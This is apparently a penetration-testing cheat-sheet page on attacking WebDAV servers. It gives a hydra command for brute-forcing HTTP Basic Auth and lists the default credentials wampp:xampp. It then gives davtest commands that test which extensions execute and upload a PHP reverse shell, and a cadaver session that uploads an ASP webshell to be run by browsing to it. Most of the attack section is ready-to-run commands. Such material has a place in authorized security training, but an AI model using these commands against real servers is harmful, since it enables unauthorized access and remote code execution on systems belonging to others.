# WebDAV

## Theory

WebDAV is a set of extensions to the Hypertext Transfer Protocol, which allows user agents to collaboratively author contents directly in an HTTP web server. Usually, to **connect** a WebDav server you will need valid **credentials.**

## Practice

### Brute-force (HTTP Basic Auth)



{% tabs %}
{% tab title="hydra" %}
WebDAV usually require valid credentials using HTTP Basic Auth. You may bruteforce it using [hydra](https://github.com/vanhauser-thc/thc-hydra)

```bash
hydra -L users.txt -P passwords.txt example.domain.local http-get /webdavDirectory/
```

{% hint style="info" %}
Default credentials are **`wampp:xampp`**
{% endhint %}
{% endtab %}
{% endtabs %}

### Upload a shell

{% tabs %}
{% tab title="Davtest" %}
**Davtest** will try to upload several files with different extensions and check if the extension is executed:

```bash
# Test and cleanup
davtest -url http://example.com/davdir -auth 'user:pass' -cleanup

#Uplaod .txt files and try to move it to other extensions
davtest -url http://example.com/davdir -auth 'user:pass' -cleanup -move 
```

If we can upload the file e.g. PHP file, upload the script for reverse shell.

```bash
davtest -url http://example.com/davdir -auth 'user:pass' -uploadfile shell.php -uploadloc shell.php
```

Then we can navigate to http://example.com/davdir/shell.php to execute it.
{% endtab %}

{% tab title="Cadaver" %}
You can use this tool to **connect to the WebDav** server and perform actions (like **upload**, **move** or **delete**) **manually**.

```bash
$ cadaver http://example.com/davdir
Username: bob
Password: 
dav:/davdir/> put /usr/share/webshells/asp/webshell.asp
```

Then we can navigate to http://example.com/davdir/webshell.asp to execute it.
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://exploit-notes.hdks.org/exploit/web/webdav-pentesting/" %}

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav" %}
